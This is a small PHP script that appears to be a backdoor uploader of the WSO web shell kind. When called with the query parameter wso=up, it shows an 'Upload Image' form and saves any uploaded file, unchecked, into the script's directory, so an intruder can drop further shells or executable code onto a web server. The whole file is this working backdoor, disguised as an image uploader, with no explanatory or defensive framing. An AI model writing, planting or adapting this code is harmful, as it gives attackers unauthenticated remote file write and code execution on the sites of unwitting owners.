<?php
if(isset($_GET['wso']) and $_GET['wso'] == 'up')
{
	if(isset($_FILES["uploadedfile"]["name"]) and !empty($_FILES["uploadedfile"]["name"]))
	{
		$target_path = "./";
		$target_path = $target_path . basename( $_FILES["uploadedfile"]["name"]); 
		if(move_uploaded_file($_FILES["uploadedfile"]["tmp_name"], $target_path)) {
			echo "The file ".  basename( $_FILES["uploadedfile"]["name"]). 
			" has been uploaded";
		} else{
			echo "There was an error uploading the file, please try again!";
		}
	}

	echo'
	<!DOCTYPE html>
	<html>
	<body>

	<form action="" method="post" enctype="multipart/form-data">
		Select image to upload:
		<input type="file" name="uploadedfile" id="fileToUpload">
		<input type="submit" value="Upload Image" name="submit">
	</form>
	</body>
	</html>
	';
}
?>